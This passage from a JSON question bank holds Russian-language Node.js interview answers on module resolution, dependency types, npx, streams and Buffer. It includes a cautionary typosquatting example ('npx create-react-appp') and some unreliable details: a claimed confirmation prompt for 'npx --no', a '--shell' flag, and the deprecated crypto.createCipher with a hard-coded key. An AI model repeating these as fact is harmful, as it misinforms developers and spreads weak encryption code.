          "answer_markdown": "\n**Ответ:**\n\n**Структура node_modules:**\n\n```\nproject/\n├── node_modules/\n│   ├── express/\n│   │   ├── package.json\n│   │   ├── node_modules/      ← Вложенные зависимости\n│   │   │   ├── body-parser/\n│   │   │   └── cookie/\n│   │   └── lib/\n│   ├── lodash/\n│   └── mongoose/\n└── package.json\n```\n\n**Алгоритм разрешения модулей:**\n\n```javascript\n// require('express')\n\n// Node.js ищет в следующем порядке:\n// 1. Core modules (встроенные)\nrequire('fs');        // ✅ Встроенный модуль\n\n// 2. Локальные файлы\nrequire('./math');    // ✅ ./math.js или ./math/index.js\n\n// 3. node_modules (вверх по дереву)\nrequire('express');\n\n/*\nПоиск express:\n1. /project/node_modules/express\n2. /project/../node_modules/express\n3. /project/../../node_modules/express\n4. ... до корня файловой системы\n*/\n```\n\n**Подробный алгоритм:**\n\n```javascript\n// require('./math')\n// 1. Ищет ./math.js\n// 2. Ищет ./math.json\n// 3. Ищет ./math.node (нативный модуль)\n// 4. Ищет ./math/package.json → \"main\" field\n// 5. Ищет ./math/index.js\n// 6. Ищет ./math/index.json\n// 7. Ищет ./math/index.node\n\n// require('express')\n// Ищет в node_modules вверх по дереву:\n// /current/path/node_modules/express\n// /current/node_modules/express\n// /node_modules/express\n```\n\n**Module caching:**\n\n```javascript\n// math.js\nconsole.log('Module loaded!');\nmodule.exports = { add: (a, b) => a + b };\n\n// app.js\nconst math1 = require('./math');  // Вывод: \"Module loaded!\"\nconst math2 = require('./math');  // Нет вывода - используется кэш\nconst math3 = require('./math');  // Нет вывода - используется кэш\n\nconsole.log(math1 === math2);  // true - тот же объект!\n\n// Очистка кэша (редко нужно)\ndelete require.cache[require.resolve('./math')];\nconst math4 = require('./math');  // Вывод: \"Module loaded!\" - загрузка заново\n```\n\n**Dependency Hell - проблема:**\n\n```\nproject/\n├── node_modules/\n│   ├── package-a/\n│   │   ├── node_modules/\n│   │   │   └── lodash@3.0.0/    ← Старая версия\n│   │   └── package.json\n│   ├── package-b/\n│   │   ├── node_modules/\n│   │   │   └── lodash@4.0.0/    ← Новая версия\n│   │   └── package.json\n│   └── lodash@4.0.0/             ← Top-level версия\n\n// Проблема: 3 копии lodash! Раздутый размер!\n```\n\n**NPM v3+ Hoisting (решение):**\n\n**Flat structure** - вытаскивание зависимостей на верхний уровень:\n\n```\nБЫЛО (npm v2):\nnode_modules/\n├── package-a/\n│   └── node_modules/\n│       └── lodash@4.0.0/\n└── package-b/\n    └── node_modules/\n        └── lodash@4.0.0/\n// Дубликаты!\n\nСТАЛО (npm v3+):\nnode_modules/\n├── package-a/\n├── package-b/\n└── lodash@4.0.0/        ← Hoisted (поднят наверх)\n// Одна копия для всех!\n```\n\n**Hoisting с конфликтами версий:**\n\n```\nЗависимости:\n- package-a нужен lodash@4.0.0\n- package-b нужен lodash@4.0.0  ← Та же версия\n- package-c нужен lodash@3.0.0  ← Другая версия!\n\nРезультат:\nnode_modules/\n├── package-a/\n├── package-b/\n├── package-c/\n│   └── node_modules/\n│       └── lodash@3.0.0/     ← Не hoisted (конфликт)\n└── lodash@4.0.0/             ← Hoisted (первая встреченная)\n```\n\n**Проблемы hoisting:**\n\n```javascript\n// ❌ ПЛОХО - phantom dependency\n// В package.json НЕ указан lodash\n// Но он работает потому что другой пакет его установил!\n\nconst _ = require('lodash');  // Работает!\n\n// Проблема:\n// 1. Если удалить пакет который установил lodash - код сломается\n// 2. Неявная зависимость\n// 3. Сложно отследить\n\n// ✅ ХОРОШО - явная зависимость\n// Добавить в package.json:\n{\n  \"dependencies\": {\n    \"lodash\": \"^4.17.21\"\n  }\n}\n```\n\n**pnpm - альтернатива npm с умным hoisting:**\n\n```bash\n# pnpm использует hard links и symlinks\n# Один пакет физически хранится один раз\n\npnpm install\n\n# Структура:\nnode_modules/\n├── .pnpm/                    ← Реальное хранилище\n│   ├── lodash@4.17.21/\n│   └── express@4.18.2/\n├── express -> .pnpm/express  ← Symlink\n└── lodash -> .pnpm/lodash    ← Symlink\n\n# Преимущества:\n# - Экономия места (одна физическая копия)\n# - Быстрая установка\n# - Строгость (нет phantom dependencies)\n```\n\n**Yarn Workspaces и Monorepo:**\n\n```json\n// package.json (root)\n{\n  \"private\": true,\n  \"workspaces\": [\n    \"packages/*\"\n  ]\n}\n\n// Структура:\nproject/\n├── node_modules/           ← Общие зависимости\n├── packages/\n│   ├── package-a/\n│   │   ├── package.json\n│   │   └── node_modules/  ← Специфичные зависимости\n│   └── package-b/\n│       ├── package.json\n│       └── node_modules/\n└── package.json\n\n// Hoisting на уровень root\n```\n\n**require.resolve() - найти путь к модулю:**\n\n```javascript\n// Узнать где находится модуль\nconst path = require.resolve('express');\nconsole.log(path);\n// /project/node_modules/express/index.js\n\n// Проверить что модуль существует\ntry {\n  require.resolve('non-existent-package');\n} catch (err) {\n  console.log('Package not found');\n}\n\n// Полезно для динамической загрузки\nconst moduleName = 'express';\nconst modulePath = require.resolve(moduleName);\nconst module = require(modulePath);\n```\n\n**ES Modules resolution:**\n\n```javascript\n// ES Modules имеют другие правила\n// Нужны явные расширения для относительных путей\n\n// ❌ ПЛОХО\nimport math from './math';\n\n// ✅ ХОРОШО\nimport math from './math.js';\n\n// Для npm пакетов расширение не нужно\nimport express from 'express';  // ✅ OK\n\n// package.json exports field\n{\n  \"exports\": {\n    \".\": \"./dist/index.js\",\n    \"./utils\": \"./dist/utils.js\"\n  }\n}\n\n// Использование:\nimport pkg from 'my-package';          // ./dist/index.js\nimport utils from 'my-package/utils';  // ./dist/utils.js\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 25,
          "question_number_in_chapter": 5,
          "question_chapter": 3,
          "question_title": "Что такое peer dependencies и optional dependencies?",
          "answer_markdown": "\n**Ответ:**\n\n**Dependencies vs DevDependencies vs PeerDependencies vs OptionalDependencies:**\n\n**1. dependencies - продакшн зависимости:**\n\n```json\n{\n  \"dependencies\": {\n    \"express\": \"^4.18.2\",\n    \"mongoose\": \"^7.0.0\"\n  }\n}\n```\n\n- Устанавливаются всегда\n- Нужны для работы приложения в production\n- Устанавливаются с `npm install`\n\n**2. devDependencies - зависимости для разработки:**\n\n```json\n{\n  \"devDependencies\": {\n    \"jest\": \"^29.0.0\",\n    \"nodemon\": \"^2.0.20\",\n    \"typescript\": \"^5.0.0\"\n  }\n}\n```\n\n- Устанавливаются только в development\n- НЕ устанавливаются с `npm install --production`\n- Используются для сборки, тестирования, линтинга\n\n**3. peerDependencies - требования к окружению:**\n\n```json\n{\n  \"name\": \"my-react-library\",\n  \"peerDependencies\": {\n    \"react\": \">=16.8.0\",\n    \"react-dom\": \">=16.8.0\"\n  }\n}\n```\n\n**Зачем нужны peer dependencies:**\n\nПредставьте что вы создаете React библиотеку:\n\n```javascript\n// ❌ ПЛОХАЯ идея - включить React в dependencies\n{\n  \"dependencies\": {\n    \"react\": \"^18.0.0\"\n  }\n}\n\n// Проблема:\n// В приложении будет ДВЕ версии React!\napp/node_modules/\n├── react@18.2.0                 ← Версия приложения\n└── my-react-library/\n    └── node_modules/\n        └── react@18.0.0         ← Версия библиотеки\n// Это сломает React! (множественные экземпляры)\n```\n\n```javascript\n// ✅ ХОРОШО - использовать peerDependencies\n{\n  \"peerDependencies\": {\n    \"react\": \">=16.8.0\"\n  }\n}\n\n// Библиотека говорит:\n// \"Я требую чтобы React был установлен в проекте,\n//  но не буду устанавливать свою версию\"\n\napp/node_modules/\n├── react@18.2.0                 ← Одна версия для всех\n└── my-react-library/            ← Использует эту же версию\n```\n\n**Установка peer dependencies:**\n\n```bash\n# npm v3-v6 - предупреждение\nnpm install my-react-library\n# Warning: requires react@>=16.8.0\n\n# npm v7+ - автоматически устанавливает peer deps\nnpm install my-react-library\n# Автоматически установит react если его нет\n\n# Отключить автоматическую установку\nnpm install --legacy-peer-deps\n```\n\n**peerDependenciesMeta - опциональные peer deps:**\n\n```json\n{\n  \"peerDependencies\": {\n    \"react\": \">=16.8.0\",          // Обязательный\n    \"typescript\": \">=4.0.0\"       // Опциональный (см. ниже)\n  },\n  \"peerDependenciesMeta\": {\n    \"typescript\": {\n      \"optional\": true            // Не обязателен\n    }\n  }\n}\n```\n\n**Примеры использования peer dependencies:**\n\n```json\n// React библиотека\n{\n  \"peerDependencies\": {\n    \"react\": \">=16.8.0\",\n    \"react-dom\": \">=16.8.0\"\n  }\n}\n\n// Webpack plugin\n{\n  \"peerDependencies\": {\n    \"webpack\": \"^5.0.0\"\n  }\n}\n\n// ESLint plugin\n{\n  \"peerDependencies\": {\n    \"eslint\": \"^8.0.0\"\n  }\n}\n\n// TypeScript types\n{\n  \"peerDependencies\": {\n    \"typescript\": \">=4.0.0\"\n  }\n}\n```\n\n**4. optionalDependencies - необязательные зависимости:**\n\n```json\n{\n  \"optionalDependencies\": {\n    \"fsevents\": \"^2.3.2\"          // Только для macOS\n  }\n}\n```\n\n- Пакет работает даже если optional dependency не установилась\n- Используется для платформо-специфичных пакетов\n- Если установка упала - npm не прервет установку\n\n**Пример использования:**\n\n```javascript\n// Попытка использовать optional dependency\nlet fsevents;\ntry {\n  fsevents = require('fsevents');  // Только на macOS\n} catch (err) {\n  // Fallback для других платформ\n  fsevents = null;\n}\n\nif (fsevents) {\n  // Используем нативный file watcher (macOS)\n  fsevents.watch(__dirname, (path, flags) => {\n    console.log('File changed:', path);\n  });\n} else {\n  // Используем кроссплатформенную альтернативу\n  const chokidar = require('chokidar');\n  chokidar.watch(__dirname).on('change', (path) => {\n    console.log('File changed:', path);\n  });\n}\n```\n\n**bundledDependencies - включенные зависимости:**\n\n```json\n{\n  \"bundledDependencies\": [\n    \"package-a\",\n    \"package-b\"\n  ]\n}\n```\n\n- Зависимости будут включены в tarball при `npm pack`\n- Редко используется\n- Полезно для приватных пакетов\n\n**Сравнительная таблица:**\n\n| Тип | Когда устанавливается | Use Case |\n|-----|----------------------|----------|\n| **dependencies** | Всегда | Runtime зависимости |\n| **devDependencies** | Только в dev | Сборка, тесты, линтинг |\n| **peerDependencies** | Предупреждение/авто | Плагины, библиотеки |\n| **optionalDependencies** | Пытается, не критично | Платформо-специфично |\n| **bundledDependencies** | Включены в пакет | Приватные пакеты |\n\n**Практический пример - создание React компонента:**\n\n```json\n{\n  \"name\": \"@myorg/button\",\n  \"version\": \"1.0.0\",\n\n  \"dependencies\": {\n    \"classnames\": \"^2.3.0\"        // Нужно в runtime\n  },\n\n  \"devDependencies\": {\n    \"@types/react\": \"^18.0.0\",    // Только для разработки\n    \"typescript\": \"^5.0.0\",       // Только для разработки\n    \"jest\": \"^29.0.0\"             // Только для разработки\n  },\n\n  \"peerDependencies\": {\n    \"react\": \">=16.8.0\",          // Должен быть в проекте\n    \"react-dom\": \">=16.8.0\"       // Должен быть в проекте\n  },\n\n  \"peerDependenciesMeta\": {\n    \"react-dom\": {\n      \"optional\": true            // react-dom опционален\n    }\n  }\n}\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 26,
          "question_number_in_chapter": 6,
          "question_chapter": 3,
          "question_title": "Как работает npx? В чем разница между npm и npx?",
          "answer_markdown": "\n**Ответ:**\n\n**npx (Node Package eXecute):**\n\nnpx - это инструмент для выполнения npm пакетов без глобальной установки. Встроен в npm с версии 5.2.0.\n\n**npm vs npx:**\n\n```bash\n# ❌ СТАРЫЙ способ (npm)\n# 1. Глобальная установка\nnpm install -g create-react-app\n\n# 2. Выполнение\ncreate-react-app my-app\n\n# Проблемы:\n# - Засоряет глобальное пространство\n# - Может быть устаревшая версия\n# - Конфликты версий\n```\n\n```bash\n# ✅ НОВЫЙ способ (npx)\nnpx create-react-app my-app\n\n# Преимущества:\n# - Не нужна глобальная установка\n# - Всегда последняя версия\n# - Одноразовое выполнение\n```\n\n**Как работает npx:**\n\n```bash\nnpx <package>\n\n# 1. Проверяет есть ли пакет в ./node_modules/.bin/\n# 2. Если нет - проверяет глобально установленные пакеты\n# 3. Если нет - временно скачивает пакет\n# 4. Выполняет пакет\n# 5. Удаляет временный пакет (если был скачан)\n```\n\n**Примеры использования:**\n\n```bash\n# 1. Запуск одноразовых команд\nnpx cowsay \"Hello World\"\n# Скачает cowsay, выполнит, удалит\n\n# 2. Создание проектов\nnpx create-react-app my-app\nnpx create-next-app my-next-app\nnpx vue create my-vue-app\n\n# 3. Выполнение локальных бинарников\nnpx eslint .\nnpx jest\nnpx tsc\n\n# 4. Запуск определенной версии\nnpx node@14 --version\nnpx typescript@4.9.0 --version\n\n# 5. Запуск из GitHub\nnpx github:user/repo\nnpx gist:hash\n\n# 6. Интерактивный выбор версии\nnpx -p node@14 -c \"node --version\"\n```\n\n**npx с аргументами:**\n\n```bash\n# -p, --package - указать пакет\nnpx -p cowsay -p lolcatjs \"cowsay hello | lolcatjs\"\n\n# -c, --call - выполнить команду\nnpx -p typescript -c \"tsc --version\"\n\n# --no-install - не устанавливать если нет\nnpx --no-install eslint .\n\n# --ignore-existing - игнорировать локальные\nnpx --ignore-existing create-react-app my-app\n\n# -y, --yes - автоматически подтвердить установку\nnpx -y create-react-app my-app\n\n# --shell - выполнить через shell\nnpx --shell \"ls -la && pwd\"\n```\n\n**package.json scripts с npx:**\n\n```json\n{\n  \"scripts\": {\n    \"lint\": \"eslint .\",\n    \"test\": \"jest\",\n    \"build\": \"webpack\"\n  }\n}\n```\n\n```bash\n# БЕЗ npx (из package.json scripts)\nnpm run lint  # Автоматически ищет в node_modules/.bin/\n\n# С npx (из командной строки)\nnpx eslint .  # Делает то же самое\n```\n\n**Создание executable пакета для npx:**\n\n```json\n// package.json\n{\n  \"name\": \"my-cli-tool\",\n  \"version\": \"1.0.0\",\n  \"bin\": {\n    \"my-tool\": \"./bin/cli.js\"\n  }\n}\n```\n\n```javascript\n#!/usr/bin/env node\n// bin/cli.js\n\nconsole.log('Hello from my CLI tool!');\n```\n\n```bash\n# После публикации можно использовать:\nnpx my-cli-tool\n```\n\n**Локальные vs глобальные пакеты:**\n\n```bash\n# Глобальная установка (СТАРЫЙ подход)\nnpm install -g typescript\ntsc --version\n\n# Локальная установка + npx (НОВЫЙ подход)\nnpm install --save-dev typescript\nnpx tsc --version\n\n# Или без установки вообще\nnpx typescript@latest --version\n```\n\n**npx для тестирования пакетов:**\n\n```bash\n# Тестирование разных версий Node.js\nnpx node@12 script.js\nnpx node@14 script.js\nnpx node@16 script.js\n\n# Тестирование разных версий пакетов\nnpx webpack@4 build\nnpx webpack@5 build\n\n# Быстрое тестирование нового пакета\nnpx some-new-package\n```\n\n**npx для code generators:**\n\n```bash\n# Генераторы проектов\nnpx create-react-app my-app\nnpx create-next-app my-next-app\nnpx degit user/repo my-project\n\n# Генераторы кода\nnpx plop  # Code generator\nnpx hygen generator new  # Template generator\n```\n\n**Безопасность с npx:**\n\n```bash\n# ⚠️ ОСТОРОЖНО - npx может выполнить любой код!\n\n# ❌ ОПАСНО - typosquatting attack\nnpx create-react-appp  # Опечатка!\n# Может выполнить вредоносный код\n\n# ✅ БЕЗОПАСНО - проверяйте имя пакета\nnpx create-react-app  # Правильное имя\n\n# ✅ Используйте --no для подтверждения\nnpx --no create-react-app my-app\n# Спросит подтверждение перед установкой\n```\n\n**Альтернативы npx:**\n\n```bash\n# 1. pnpm dlx (аналог npx)\npnpm dlx create-react-app my-app\n\n# 2. yarn create\nyarn create react-app my-app\n# Это алиас для: yarn global add create-react-app && create-react-app\n\n# 3. Прямой запуск из node_modules\n./node_modules/.bin/eslint .\n```\n\n**Использование npx в CI/CD:**\n\n```yaml\n# .github/workflows/test.yml\nname: Test\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      - uses: actions/setup-node@v2\n\n      # Использование npx для одноразовых команд\n      - run: npx jest\n      - run: npx eslint .\n      - run: npx tsc --noEmit\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        }
      ]
    },
    {
      "chapter_number": 4,
      "chapter_title": "Streams & Buffers",
      "questions_count": 5,
      "questions": [
        {
          "question_number": 27,
          "question_number_in_chapter": 1,
          "question_chapter": 4,
          "question_title": "Что такое Streams в Node.js? Какие типы стримов существуют?",
          "answer_markdown": "\n**Ответ:**\n\n**Streams** - это абстракция для работы с потоковыми данными в Node.js. Они позволяют обрабатывать данные по частям (chunks), не загружая весь объем в память.\n\n**4 основных типа стримов:**\n\n| Тип | Описание | Примеры | Методы |\n|-----|----------|---------|--------|\n| **Readable** | Можно читать | `fs.createReadStream()`, `http.IncomingMessage` | `read()`, `pipe()`, `pause()`, `resume()` |\n| **Writable** | Можно записывать | `fs.createWriteStream()`, `http.ServerResponse` | `write()`, `end()`, `cork()`, `uncork()` |\n| **Duplex** | Можно читать И записывать | `net.Socket`, TCP сокеты | Комбинация Readable + Writable |\n| **Transform** | Дуплекс с трансформацией | `zlib.createGzip()`, `crypto.createCipher()` | `_transform()`, `_flush()` |\n\n**Readable Stream:**\n\n```javascript\nconst fs = require('fs');\n\n// Создание readable stream\nconst readStream = fs.createReadStream('large-file.txt', {\n  encoding: 'utf8',\n  highWaterMark: 64 * 1024 // Размер чанка 64KB (по умолчанию 16KB)\n});\n\n// Способ 1: Event-based (paused mode)\nreadStream.on('data', (chunk) => {\n  console.log(`Получен чанк размером: ${chunk.length}`);\n  console.log(chunk);\n});\n\nreadStream.on('end', () => {\n  console.log('Чтение завершено');\n});\n\nreadStream.on('error', (err) => {\n  console.error('Ошибка чтения:', err);\n});\n\n// Способ 2: Flowing mode с pipe()\nconst writeStream = fs.createWriteStream('copy.txt');\nreadStream.pipe(writeStream);\n```\n\n**Writable Stream:**\n\n```javascript\nconst fs = require('fs');\n\nconst writeStream = fs.createWriteStream('output.txt');\n\n// Запись данных\nwriteStream.write('Строка 1\\n');\nwriteStream.write('Строка 2\\n');\nwriteStream.write('Строка 3\\n');\n\n// Завершение записи\nwriteStream.end('Последняя строка\\n');\n\nwriteStream.on('finish', () => {\n  console.log('Запись завершена');\n});\n\nwriteStream.on('error', (err) => {\n  console.error('Ошибка записи:', err);\n});\n```\n\n**Duplex Stream:**\n\n```javascript\nconst { Duplex } = require('stream');\n\nclass MyDuplex extends Duplex {\n  constructor(options) {\n    super(options);\n    this.data = [];\n  }\n\n  // Реализация чтения\n  _read(size) {\n    if (this.data.length === 0) {\n      this.push(null); // Конец чтения\n    } else {\n      this.push(this.data.shift());\n    }\n  }\n\n  // Реализация записи\n  _write(chunk, encoding, callback) {\n    this.data.push(chunk);\n    callback();\n  }\n}\n\nconst myDuplex = new MyDuplex();\n\n// Записываем\nmyDuplex.write('Данные 1');\nmyDuplex.write('Данные 2');\nmyDuplex.end();\n\n// Читаем\nmyDuplex.on('data', (chunk) => {\n  console.log(chunk.toString());\n});\n```\n\n**Transform Stream:**\n\n```javascript\nconst { Transform } = require('stream');\n\n// Трансформация в верхний регистр\nclass UpperCaseTransform extends Transform {\n  _transform(chunk, encoding, callback) {\n    // Трансформируем данные\n    const upperChunk = chunk.toString().toUpperCase();\n    this.push(upperChunk);\n    callback();\n  }\n}\n\nconst upperCase = new UpperCaseTransform();\n\nprocess.stdin\n  .pipe(upperCase)\n  .pipe(process.stdout);\n\n// Ввод: hello world\n// Вывод: HELLO WORLD\n```\n\n**Цепочки (Chaining) стримов:**\n\n```javascript\nconst fs = require('fs');\nconst zlib = require('zlib');\nconst crypto = require('crypto');\n\n// Читаем файл -> Шифруем -> Сжимаем -> Записываем\nfs.createReadStream('input.txt')\n  .pipe(crypto.createCipher('aes192', 'secret-key'))\n  .pipe(zlib.createGzip())\n  .pipe(fs.createWriteStream('output.txt.gz.enc'));\n```\n\n**Object Mode:**\n\nПо умолчанию стримы работают с Buffer/String. Но можно использовать **Object Mode** для передачи JavaScript объектов:\n\n```javascript\nconst { Transform } = require('stream');\n\nconst jsonTransform = new Transform({\n  objectMode: true, // ← Режим объектов\n  transform(obj, encoding, callback) {\n    // obj - это JavaScript объект, не Buffer\n    obj.processed = true;\n    obj.timestamp = Date.now();\n    this.push(obj);\n    callback();\n  }\n});\n\n// Использование\njsonTransform.write({ id: 1, name: 'Alice' });\njsonTransform.write({ id: 2, name: 'Bob' });\n\njsonTransform.on('data', (obj) => {\n  console.log(obj);\n  // { id: 1, name: 'Alice', processed: true, timestamp: 1699999999999 }\n});\n```\n\n**Практическое применение:**\n\n```javascript\nconst fs = require('fs');\nconst readline = require('readline');\n\n// Построчное чтение ОГРОМНОГО файла (без загрузки в память)\nasync function processLargeFile(filePath) {\n  const fileStream = fs.createReadStream(filePath);\n\n  const rl = readline.createInterface({\n    input: fileStream,\n    crlfDelay: Infinity\n  });\n\n  let lineNumber = 0;\n\n  for await (const line of rl) {\n    lineNumber++;\n    // Обработка каждой строки\n    if (line.includes('ERROR')) {\n      console.log(`Ошибка на строке ${lineNumber}: ${line}`);\n    }\n  }\n}\n\nprocessLargeFile('app.log');\n```\n\n**Преимущества Streams:**\n\n1. **Эффективность памяти** - обработка по частям, а не целиком\n2. **Композиция** - легко объединять (pipe)\n3. **Производительность** - начинаем обработку до полной загрузки данных\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 28,
          "question_number_in_chapter": 2,
          "question_chapter": 4,
          "question_title": "Что такое Backpressure в стримах? Как его правильно обрабатывать?",
          "answer_markdown": "\n**Ответ:**\n\n**Backpressure (противодавление)** - это ситуация, когда данные поступают быстрее, чем успевают обрабатываться. Например, чтение файла происходит быстрее, чем запись в медленный диск.\n\n**Проблема:**\n\n```javascript\nconst fs = require('fs');\n\nconst readStream = fs.createReadStream('large-file.txt');\nconst writeStream = fs.createWriteStream('output.txt');\n\n// ❌ НЕПРАВИЛЬНО - не учитывает backpressure\nreadStream.on('data', (chunk) => {\n  // writeStream.write() может вернуть false, если буфер заполнен\n  // Но мы это игнорируем → переполнение памяти\n  writeStream.write(chunk);\n});\n```\n\n**Как Node.js сигнализирует о Backpressure:**\n\nМетод `writable.write(chunk)` возвращает:\n- `true` - буфер не заполнен, можно продолжать запись\n- `false` - буфер заполнен, **нужно остановить чтение**\n\n**Правильная обработка Backpressure (способ 1 - ручной):**\n\n```javascript\nconst fs = require('fs');\n\nconst readStream = fs.createReadStream('large-file.txt');\nconst writeStream = fs.createWriteStream('output.txt');\n\nreadStream.on('data', (chunk) => {\n  const canContinue = writeStream.write(chunk);\n\n  if (!canContinue) {\n    // Буфер записи заполнен → приостанавливаем чтение\n    console.log('Backpressure! Приостанавливаем чтение');\n    readStream.pause();\n  }\n});\n\n// Когда буфер записи освободился → возобновляем чтение\nwriteStream.on('drain', () => {\n  console.log('Буфер освобожден. Возобновляем чтение');\n  readStream.resume();\n});\n\nreadStream.on('end', () => {\n  writeStream.end();\n});\n```\n\n**Правильная обработка Backpressure (способ 2 - pipe):**\n\n```javascript\nconst fs = require('fs');\n\nconst readStream = fs.createReadStream('large-file.txt');\nconst writeStream = fs.createWriteStream('output.txt');\n\n// ✅ ПРАВИЛЬНО - pipe() автоматически обрабатывает backpressure\nreadStream.pipe(writeStream);\n\n// pipe() внутри делает:\n// 1. Слушает событие 'data'\n// 2. Проверяет результат write()\n// 3. Вызывает pause() если write() вернул false\n// 4. Слушает 'drain' и вызывает resume()\n```\n\n**Пример с Transform Stream и Backpressure:**\n\n```javascript\nconst { Transform } = require('stream');\nconst fs = require('fs');\n\nclass SlowTransform extends Transform {\n  _transform(chunk, encoding, callback) {\n    // Имитация медленной обработки\n    setTimeout(() => {\n      this.push(chunk.toString().toUpperCase());\n      callback();\n    }, 100);\n  }\n}\n\nconst slowTransform = new SlowTransform();\n\n// Backpressure автоматически обработается через pipe()\nfs.createReadStream('input.txt')\n  .pipe(slowTransform)\n  .pipe(fs.createWriteStream('output.txt'));\n```\n\n**Визуализация Backpressure:**\n\n```\nReadable Stream (быстрое чтение)\n    ↓ data chunks\n    ↓ ← pipe() управляет потоком\nTransform Stream (медленная обработка)\n    ↓ transformed chunks\n    ↓ ← backpressure сигнал\nWritable Stream (медленная запись)\n\nКогда Writable буфер заполняется:\n1. write() возвращает false\n2. Writable эмитит 'drain' когда готов к записи\n3. pipe() автоматически:\n   - Вызывает pause() на Readable\n   - Слушает 'drain'\n   - Вызывает resume() на Readable\n```\n\n**Настройка размера буфера:**\n\n```javascript\nconst readStream = fs.createReadStream('file.txt', {\n  highWaterMark: 64 * 1024 // 64KB буфер (по умолчанию 16KB)\n});\n\nconst writeStream = fs.createWriteStream('output.txt', {\n  highWaterMark: 32 * 1024 // 32KB буфер\n});\n\n// Если readStream читает большими чанками (64KB),\n// а writeStream пишет малыми (32KB)\n// → backpressure возникнет быстрее\n```\n\n**Практический пример - загрузка файла через HTTP:**\n\n```javascript\nconst http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/download' && req.method === 'GET') {\n    const filePath = './large-video.mp4';\n\n    // Проверяем размер файла\n    const stat = fs.statSync(filePath);\n    res.writeHead(200, {\n      'Content-Type': 'video/mp4',\n      'Content-Length': stat.size\n    });\n\n    // ✅ Стрим автоматически обрабатывает backpressure\n    // Если клиент медленно скачивает → чтение замедлится\n    const readStream = fs.createReadStream(filePath);\n    readStream.pipe(res);\n\n    readStream.on('error', (err) => {\n      res.statusCode = 500;\n      res.end('Server Error');\n    });\n  }\n}).listen(3000);\n```\n\n**Monitoring Backpressure:**\n\n```javascript\nconst fs = require('fs');\n\nconst readStream = fs.createReadStream('large-file.txt');\nconst writeStream = fs.createWriteStream('output.txt');\n\nlet pausedCount = 0;\nlet resumedCount = 0;\n\nreadStream.on('data', (chunk) => {\n  const canWrite = writeStream.write(chunk);\n\n  if (!canWrite) {\n    pausedCount++;\n    console.log(`Backpressure! Пауз: ${pausedCount}`);\n    readStream.pause();\n  }\n});\n\nwriteStream.on('drain', () => {\n  resumedCount++;\n  console.log(`Возобновление. Возобновлений: ${resumedCount}`);\n  readStream.resume();\n});\n\nwriteStream.on('finish', () => {\n  console.log(`Завершено. Пауз: ${pausedCount}, Возобновлений: ${resumedCount}`);\n});\n\nreadStream.on('end', () => {\n  writeStream.end();\n});\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 29,
          "question_number_in_chapter": 3,
          "question_chapter": 4,
          "question_title": "В чем разница между Buffer и обычным массивом?",
          "answer_markdown": "\n**Ответ:**\n\n**Buffer** - это специальный класс в Node.js для работы с бинарными данными. Он представляет фиксированный блок памяти (не регулируемый V8 garbage collector).\n\n**Основные различия:**\n\n| Характеристика | Buffer | Array |\n|----------------|--------|-------|\n| **Тип данных** | Бинарные данные (байты) | Любые JavaScript значения |\n| **Размер элемента** | Всегда 1 байт (0-255) | Динамический (зависит от типа) |\n| **Память** | Фиксированный размер, выделяется вне V8 heap | Динамический размер, в V8 heap |\n| **Изменяемость размера** | Нельзя изменить после создания | Можно изменить (push, pop, splice) |\n| **Производительность** | Быстрее для бинарных данных | Медленнее для бинарных операций |\n| **Использование** | Файлы, сеть, криптография | Коллекции JavaScript объектов |\n\n**Создание Buffer:**\n\n```javascript\n// 1. Создание пустого буфера размером 10 байт\nconst buf1 = Buffer.alloc(10);\nconsole.log(buf1); // <Buffer 00 00 00 00 00 00 00 00 00 00>\n\n// 2. Создание буфера с неинициализированной памятью (быстрее, но небезопасно)\nconst buf2 = Buffer.allocUnsafe(10);\nconsole.log(buf2); // <Buffer произвольные данные из памяти>\n\n// 3. Создание из строки\nconst buf3 = Buffer.from('Hello');\nconsole.log(buf3); // <Buffer 48 65 6c 6c 6f>\nconsole.log(buf3.toString()); // 'Hello'\n\n// 4. Создание из массива байтов\nconst buf4 = Buffer.from([72, 101, 108, 108, 111]);\nconsole.log(buf4.toString()); // 'Hello'\n\n// 5. Создание из другого буфера (копия)\nconst buf5 = Buffer.from(buf3);\n```\n\n**Работа с Buffer vs Array:**\n\n```javascript\n// === Array ===\nconst arr = [1, 2, 3];\narr.push(4);              // Можно изменить размер\narr[0] = 'string';        // Можно хранить любые типы\nconsole.log(arr.length);  // 4\n\n// === Buffer ===\nconst buf = Buffer.alloc(3);\nbuf[0] = 255;             // Только числа 0-255\nbuf[1] = 256;             // 256 % 256 = 0 (переполнение)\n// buf.push(4);           // ❌ TypeError: buf.push is not a function\nconsole.log(buf.length);  // 3 (фиксированный размер)\nconsole.log(buf);         // <Buffer ff 00 00>\n```\n\n**Кодирование строк:**\n\n```javascript\nconst buf = Buffer.from('Привет', 'utf8');\n\n// Поддерживаемые кодировки:\n// 'utf8', 'utf16le', 'latin1', 'base64', 'hex', 'ascii'\n\nconsole.log(buf.toString('utf8'));    // 'Привет'\nconsole.log(buf.toString('hex'));     // 'd09fd180d0b8d0b2d0b5d182'\nconsole.log(buf.toString('base64'));  // '0J/RgNC40LLQtdGC'\n\n// Преобразование между кодировками\nconst base64String = buf.toString('base64');\nconst backToBuf = Buffer.from(base64String, 'base64');\nconsole.log(backToBuf.toString('utf8')); // 'Привет'\n```\n\n**Производительность:**\n\n```javascript\nconst iterations = 1000000;\n\n// === Array (медленно для бинарных данных) ===\nconsole.time('Array');\nconst arr = [];\nfor (let i = 0; i < iterations; i++) {\n  arr.push(i % 256);\n}\nconsole.timeEnd('Array'); // ~100ms\n\n// === Buffer (быстро для бинарных данных) ===\nconsole.time('Buffer');\nconst buf = Buffer.alloc(iterations);\nfor (let i = 0; i < iterations; i++) {\n  buf[i] = i % 256;\n}\nconsole.timeEnd('Buffer'); // ~20ms (в 5 раз быстрее!)\n```\n\n**Манипуляция с Buffer:**\n\n```javascript\nconst buf = Buffer.from('Hello World');\n\n// Чтение\nconsole.log(buf[0]);           // 72 (ASCII код 'H')\nconsole.log(buf.length);       // 11\n\n// Запись\nbuf[0] = 74;                   // 'J'\nconsole.log(buf.toString());   // 'Jello 